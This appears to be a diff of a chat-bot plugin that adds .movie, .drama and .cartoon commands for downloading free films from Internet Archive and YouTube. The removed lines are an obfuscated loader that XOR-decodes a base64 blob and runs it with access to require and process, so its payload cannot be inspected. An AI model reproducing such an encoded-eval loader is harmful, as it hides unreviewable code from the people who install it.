@@ -1,9 +1,122 @@
 'use strict';
-(function(){
-  const K=Buffer.from('REVDQU5YTUQtMjAyNg==','base64');
-  const D='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';
-  const X=Buffer.from(D,'base64');
-  for(let i=0;i<X.length;i++) X[i]^=K[i%K.length];
-  const C=X.toString('utf8');
-  return (new Function('require','module','exports','__filename','__dirname','process','Buffer',C))(require,module,exports,__filename,__dirname,process,Buffer);
-})();
+/**
+ * DECAN XMD v1.2.0 — fourth pack: .movie / .drama / .cartoon download as documents.
+ *
+ *   .movie <title>          details card (as before) + free full-length copies found, numbered
+ *   .movie <number>         download that copy and send it as a document
+ *   .movie <video link>     download any supported link (YouTube, Archive…) as a document
+ *   .drama <title> / .cartoon <title>   same flow for series episodes and cartoons
+ *
+ * Sources are legal and free: Internet Archive (public-domain / freely licensed) and YouTube full-length uploads. No pirate sites.
+ * Files are streamed to disk and sent from disk, so big files work (limits: MAX_MOVIE_MB, MAX_MOVIE_MINUTES).
+ */
+const U = require('../lib/util');
+const { UserError, bold } = U;
+const fm = require('../lib/freemovies');
+const bm = require('../lib/bigmedia');
+const flows = require('../lib/appflow');
+
+const SINCE = '1.2.0';
+
+module.exports = ({ def, registry }) => {
+  const P = ctx => ctx.var('PREFIX');
+
+  async function showList(ctx, kind, q, { quietEmpty = false } = {}) {
+    const { items, failed } = await fm.search(q, kind);
+    if (!items.length) {
+      if (quietEmpty) return false;
+      throw new UserError(failed.length === 2 ? 'Neither Internet Archive nor YouTube answered. Try again in a minute.' : `No free full-length ${kind} found for *${q}*. Most recent films are not legally free; try an older title or a different spelling.`);
+    }
+    flows.savePicks(ctx, kind, items);
+    await ctx.reply(`${items.map(fm.line).join('\n\n')}\n\n⬇️ Send *${P(ctx)}${kind} <number>* to get it as a document.\n_Free & legal sources only: Internet Archive and YouTube._${failed.length ? `\n⚠️ Not reachable right now: ${failed.join(', ')}` : ''}`, { title: `🎬 ${fm.KINDS[kind].label}: ${q}`.slice(0, 60) });
+    return true;
+  }
+
+  async function sendCopy(ctx, kind, it) {
+    const L = bm.limits();
+    await ctx.react?.('⏳');
+    await ctx.reply(`⏳ Fetching ${bold(it.title)}…\nBig files take a few minutes. I will send it here as a document when it is ready.`, { title: fm.KINDS[kind].label });
+    let file, cleanup;
+    if (it.src === 'archive') {
+      const f = await fm.archiveFileFor(it, L.movie * bm.MB);
+      const d = await bm.downloadToFile(f.url, { maxBytes: L.movie * bm.MB });
+      file = { path: d.path, name: d.name }; cleanup = d.cleanup;
+    } else {
+      const r = await bm.fetchVideo(it.url, { quality: 720, maxMb: L.movie, maxMinutes: L.movieMinutes, cookies: ctx.get('yt_cookies', '') || undefined });
+      file = { path: r.items[0].path, name: `${bm.safeName(r.title)}.${r.items[0].ext || 'mp4'}` }; cleanup = r.cleanup;
+    }
+    try {
+      const size = require('fs').statSync(file.path).size;
+      const ext = (/\.([a-z0-9]{2,4})$/i.exec(file.name) || [, 'mp4'])[1].toLowerCase();
+      await bm.sendDoc(ctx, file.path, `${bm.safeName(it.title)}.${ext}`, ext === 'mp4' ? 'video/mp4' : 'application/octet-stream', `🎬 ${it.title}${it.year ? ` (${it.year})` : ''}\n💾 ${U.fmtBytes(size)} · ${it.src === 'archive' ? 'Internet Archive' : 'YouTube'}`);
+      await ctx.react?.('✅');
+    } finally { cleanup(); }
+  }
+
+  /** shared entry: number -> download that pick; link -> download it; text -> search */
+  async function flow(ctx, kind, q, before) {
+    if (/^\d{1,2}$/.test(q)) return sendCopy(ctx, kind, flows.loadPick(ctx, kind, Number(q)));
+    if (U.isUrl(q)) {
+      const url = U.findUrl(q);
+      return sendCopy(ctx, kind, { src: 'youtube', title: 'Video', url });
+    }
+    let infoErr = null;
+    let found;
+    if (before) {
+      const [, search] = await Promise.allSettled([
+        before().catch(e => { if (e instanceof UserError) infoErr = e; }),
+        showList(ctx, kind, q, { quietEmpty: true })
+      ]);
+      if (search.status === 'rejected') throw search.reason;
+      found = search.value;
+    } else {
+      found = await showList(ctx, kind, q);
+    }
+    if (!found && infoErr) throw infoErr;
+    if (!found) await ctx.reply(`No free full-length copy was found for *${q}*.\nMost recent films are not legally free to download.`, { title: fm.KINDS[kind].label });
+  }
+
+  /* ---- .movie keeps its details card; the download list is added underneath. A separate command object so imdb/tmdb/movieinfo stay as they were. */
+  const origMovie = registry.get('movie');
+  if (origMovie) {
+    const run = async ctx => {
+      const q = ctx.input().trim();
+      if (!q) throw new UserError(`Which movie? Example: *${P(ctx)}movie night of the living dead* (then *${P(ctx)}movie 1* to download).`);
+      return flow(ctx, 'movie', q, /^\d{1,2}$/.test(q) || U.isUrl(q) ? null : () => origMovie.run(ctx));
+    };
+    const movie = { ...origMovie, name: 'movie', names: ['movie'], since: SINCE, usage: 'movie <title> • movie <number> • movie <link>', desc: 'Movie details, plus free full-length copies you can download as a document (Internet Archive, YouTube).', run };
+    registry.set('movie', movie);
+    registry.set('movies', { ...movie, name: 'movies', names: ['movies'] });
+  }
+
+  def(['drama', 'dramas', 'episode'], { since: SINCE, cat: 'download', heavy: true, usage: 'drama <title> • drama <number> • drama <link>', desc: 'Find a free full drama / series episode and download it as a document.' }, async ctx => {
+    const q = ctx.input().trim();
+    if (!q) throw new UserError(`Which drama? Example: *${P(ctx)}drama the twilight zone* (then *${P(ctx)}drama 1*).`);
+    return flow(ctx, 'drama', q);
+  });
+
+  /* ---- .cartoon was a photo effect; with a photo it still is, with a title it finds cartoons */
+  const origCartoon = registry.get('cartoon');
+  const cartoonRun = async ctx => {
+    const q = ctx.input().trim();
+    const hasPhoto = Boolean(ctx.quoted) || Boolean(ctx.mediaTypeOf?.(ctx.unwrap?.(ctx.msg?.message)));
+    if (hasPhoto && origCartoon) return origCartoon.run(ctx);
+    if (!q) throw new UserError(`Which cartoon? Example: *${P(ctx)}cartoon popeye* (then *${P(ctx)}cartoon 1*). Reply to a photo instead to cartoonize it.`);
+    return flow(ctx, 'cartoon', q);
+  };
+  const animeRun = async ctx => {
+    const q = ctx.input().trim();
+    const hasPhoto = Boolean(ctx.quoted) || Boolean(ctx.mediaTypeOf?.(ctx.unwrap?.(ctx.msg?.message)));
+    if (hasPhoto && origCartoon) return origCartoon.run(ctx);
+    if (!q) throw new UserError(`Which anime? Example: *${P(ctx)}anime astro boy* (then *${P(ctx)}anime 1*). Reply to a photo instead to cartoonize it.`);
+    return flow(ctx, 'cartoon', q);
+  };
+  if (origCartoon) {
+    const cartoon = { ...origCartoon, name: 'cartoon', names: ['cartoon'], since: SINCE, usage: 'cartoon <title> • cartoon <number> • (reply to a photo to cartoonize it)', desc: 'Find free full cartoons and download them as documents; reply to a photo to turn it into a cartoon.', run: cartoonRun };
+    registry.set('cartoon', cartoon);
+    registry.set('anime', { ...cartoon, name: 'anime', names: ['anime'], usage: 'anime <title> • anime <number> • (reply to a photo to cartoonize it)', desc: 'Find free anime and cartoons; reply to a photo to turn it into a cartoon.', run: animeRun });
+  }
+  else def('cartoon', { since: SINCE, cat: 'download', heavy: true, usage: 'cartoon <title>', desc: 'Find free full cartoons and download them as documents.' }, cartoonRun);
+};
+
+module.exports.__test = { SINCE };
